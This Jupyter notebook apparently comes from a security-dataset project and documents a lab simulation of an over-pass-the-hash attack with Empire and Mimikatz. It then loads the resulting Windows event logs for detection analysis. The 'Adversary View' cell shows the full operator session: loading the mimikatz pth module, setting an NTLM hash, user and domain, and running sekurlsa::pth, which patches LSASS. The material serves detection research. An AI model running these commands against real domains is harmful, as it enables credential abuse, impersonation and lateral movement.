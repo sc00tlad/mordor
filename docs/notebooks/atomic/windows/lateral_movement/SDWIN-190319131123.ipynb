{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3dcb35a1",
   "metadata": {},
   "source": [
    "# Empire Over-Pass-The-Hash"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddb3893a",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "028d793b",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/19 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005),[TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1550.002](https://attack.mitre.org/techniques/T1550/002) |\n",
    "| Tags              | Over-Pass-The-Hash,Patching LSASS |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f2a2cb2d",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries taking a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged Kerberos TGT. In this case, an adversary can write the hash/key into an existing logon session (i.e. a sacrificial logon session) section in the memory content of LSASS and kick off the regular Kerberos authentication process."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f599e72",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc2556ed",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_over_pth_patch_lsass.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_over_pth_patch_lsass.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91eec7ae",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fa654cd0",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fb0ba36c",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [mimikataz_pth](https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "376befbf",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "4EH9PC5S ps 172.18.39.6     WORKSTATION6      *THESHIRE\\wardog        powershell         5056   5/0.0    2020-09-22 02:12:12  http            \n",
    "\n",
    "(Empire: agents) > interact 4EH9PC5S\n",
    "(Empire: 4EH9PC5S) > \n",
    "(Empire: 4EH9PC5S) > usemodule credentials/mimikatz/pth*\n",
    "(Empire: powershell/credentials/mimikatz/pth) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz PTH\n",
    "            Module: powershell/credentials/mimikatz/pth\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to execute\n",
    "  sekurlsa::pth to create a new process. with a specific\n",
    "  user's hash. Use credentials/tokens to steal the token\n",
    "  afterwards.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n",
    "  http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-\n",
    "  hash-with-mimikatz/\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name   Required    Value                     Description\n",
    "  ----   --------    -------                   -----------\n",
    "  Agent  True        4EH9PC5S                  Agent to run module on.                 \n",
    "  CredID False                                 CredID from the store to use for ticket \n",
    "                                              creation.                               \n",
    "  user   False                                 Username to impersonate.                \n",
    "  domain False                                 The fully qualified domain name.        \n",
    "  ntlm   False                                 The NTLM hash to use.                   \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/pth) > set ntlm 81d310fa34e6a56a31145445891bb7b8\n",
    "(Empire: powershell/credentials/mimikatz/pth) > set user pgustavo\n",
    "(Empire: powershell/credentials/mimikatz/pth) > set domain theshire.local\n",
    "(Empire: powershell/credentials/mimikatz/pth) > execute\n",
    "[*] Tasked 4EH9PC5S to run TASK_CMD_JOB\n",
    "[*] Agent 4EH9PC5S tasked with task ID 1\n",
    "[*] Tasked agent 4EH9PC5S to run module powershell/credentials/mimikatz/pth\n",
    "(Empire: powershell/credentials/mimikatz/pth) > \n",
    "Job started: 1WCLFA\n",
    "\n",
    "Hostname: WORKSTATION6.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # sekurlsa::pth /user:pgustavo /domain:theshire.local /ntlm:81d310fa34e6a56a31145445891bb7b8\n",
    "user    : pgustavo\n",
    "domain  : theshire.local\n",
    "program : cmd.exe\n",
    "impers. : no\n",
    "NTLM    : 81d310fa34e6a56a31145445891bb7b8\n",
    "  |  PID  3148\n",
    "  |  TID  6488\n",
    "  |  LSA Process is now R/W\n",
    "  |  LUID 0 ; 69262895 (00000000:0420de2f)\n",
    "  \\_ msv1_0   - data copy @ 000001C7E0166C80 : OK !\n",
    "  \\_ kerberos - data copy @ 000001C7E02B1268\n",
    "  \\_ aes256_hmac       -> null             \n",
    "  \\_ aes128_hmac       -> null             \n",
    "  \\_ rc4_hmac_nt       OK\n",
    "  \\_ rc4_hmac_old      OK\n",
    "  \\_ rc4_md4           OK\n",
    "  \\_ rc4_hmac_nt_exp   OK\n",
    "  \\_ rc4_hmac_old_exp  OK\n",
    "  \\_ *Password replace @ 000001C7E01AEDE8 (32) -> null\n",
    "\n",
    "Use credentials/token to steal the token of the created PID.\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7805cf4",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c8c6e2e",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c358a05a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_over_pth_patch_lsass.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "418578ce",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79f52c51",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ddb4837",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee277157",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "34c1600f",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/GhostPack/Rubeus#example-over-pass-the-hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash) \n",
    "* [https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
